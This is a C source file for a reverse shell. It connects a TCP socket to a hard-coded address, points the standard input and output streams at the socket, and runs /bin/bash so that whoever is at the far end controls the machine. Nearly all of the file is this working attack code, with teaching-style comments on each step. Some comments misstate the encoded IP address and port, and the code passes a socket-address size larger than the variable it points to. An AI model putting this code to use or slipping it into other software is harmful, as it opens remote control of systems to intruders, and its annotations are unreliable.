#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>

char *get_errno_message() {
	char *errno_message = strerror(errno);
	static char buffer[100];
	sprintf(buffer, "errno(%d): %s\n", errno, errno_message);
	return buffer;
};

int main(int argc, char **argv) {
	int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (s < 0) {
		fprintf(stderr, "Line %d: %s\n", (__LINE__ - 1), get_errno_message());
		return 1;
	};

	unsigned long addr = 0x0100007f11120002;		// IP Address -> 1.0.0.127, port -> 25 46, Internet Family -> 2 (AF_INET) (struct sockaddr_in in Little Endian)
	char *name[2] = {"/bin/bash", NULL};
	while (connect(s, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) {
	};

	dup2(s, 0);	// So that way 0 points to the socket file descriptor in the process container instead of the local keyboard
	dup2(s, 1);	// So that way 1 points to the socket file descriptor instead of the local terminal window
	dup2(s, 2);	// So that way 2 points to the socket file descriptor instead of the local terminal window
	execv(name[0], name);	// Create a bash shell in the process container which replaces this programs process with it, then it's process points to the same stdin, stdout, and stderr that point to the socket file descriptor

	return 0;		// End this program process, because the shell process has now overwritten this process and is now controlling/owns the process container instead of this program
	/*
		stdin from user on peer socket in socket file descriptor is pointed to by stdin, stdin is pointed to by the shell process, the shell process then evaluates the data from stdin,
		then writes it's output to the stdout file descriptor, which is then redirected to the socket file descriptor, which is then sent across the network to the user peer socket
	*/

};
